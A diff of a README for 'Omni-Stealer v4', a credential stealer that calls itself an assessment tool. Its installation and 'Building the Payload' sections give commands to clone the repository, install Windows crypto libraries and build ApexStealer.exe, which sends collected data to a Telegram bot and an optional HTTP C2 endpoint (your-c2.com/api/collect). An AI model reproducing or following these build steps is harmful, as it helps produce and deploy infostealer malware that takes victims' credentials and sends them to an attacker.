@@ -89,37 +89,39 @@ Omni-Stealer v4 is a **post-exploitation credential assessment tool** designed f
 - **Python**: 3.10+
 - **Pip packages**: `pywin32`, `cryptography`, `pyinstaller`, `comtypes`
 
-### Installation
+# OMNI‑STEALER — Installation & Builder Guide
 
-```powershell
-# Clone
+A modular data‑collection framework with Telegram alerting and optional HTTP C2 support.
+This guide explains installation, environment verification, and payload building.
+
+## Installation
+
+Clone the repository:
 git clone https://github.com/tanvirahmedcs/OMNI-STEALER.git
 cd OMNI-STEALER
 
-# Install dependencies
+Install dependencies:
 pip install -r requirements.txt
 
-# Verify environment
+Verify environment:
 python -c "import win32crypt; from cryptography.hazmat.primitives.ciphers.aead import AESGCM; import comtypes; print('All dependencies OK')"
-```
 
-### Building the Payload
+## Building the Payload
 
-```powershell
-# Interactive mode (prompts for Telegram credentials)
+### Interactive mode
 python omni_stealer_builder.py
 
-# Command-line mode
+### Command-line mode
 python omni_stealer_builder.py "<BOT_TOKEN>" "<CHAT_ID>"
 
-# With optional HTTP C2
+### With optional HTTP C2
 python omni_stealer_builder.py "<BOT_TOKEN>" "<CHAT_ID>" "https://your-c2.com/api/collect"
 
-# Using environment variables
+### Using environment variables
 set TELEGRAM_BOT_TOKEN=your_token
 set TELEGRAM_CHAT_ID=your_chat_id
 python omni_stealer_builder.py
-```
+
 
 On success, `ApexStealer.exe` appears in the current directory.
 
